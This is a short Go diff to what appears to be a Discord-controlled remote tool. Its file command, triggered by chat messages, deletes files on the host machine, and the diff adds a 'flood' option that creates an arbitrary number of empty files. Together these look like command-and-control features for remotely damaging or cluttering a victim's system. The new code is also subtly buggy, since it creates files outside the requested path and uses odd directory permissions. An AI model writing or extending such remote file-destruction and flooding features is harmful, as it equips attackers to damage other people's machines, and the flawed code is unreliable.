@@ -3,7 +3,9 @@ package commands
 import (
 	"fmt"
 	"os"
+	"path/filepath"
 	"strings"
+	"time"
 
 	"requiem/utils"
 
@@ -31,11 +33,31 @@ func (*FileCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 			return
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully deleted - %s", path), msg.Reference())
-	} else {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully deleted %q", path), msg.Reference())
 		return
 	}
+
+	if utils.HasFlag(content, "flood") {
+		count, found := utils.FindNumber(content)
+		if found == false {
+			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a number.", msg.Reference())
+			return
+		}
+
+		os.MkdirAll(filepath.Dir(path), 0666)
+
+		for i := range count {
+			name := fmt.Sprintf("%d%d", time.Now().UnixNano(), i)
+
+			file, _ := os.Create(name)
+			file.Close()
+		}
+
+		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully flooded %q", path), msg.Reference())
+		return
+	}
+
+	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
 }
 
 func (*FileCommand) Name() string {
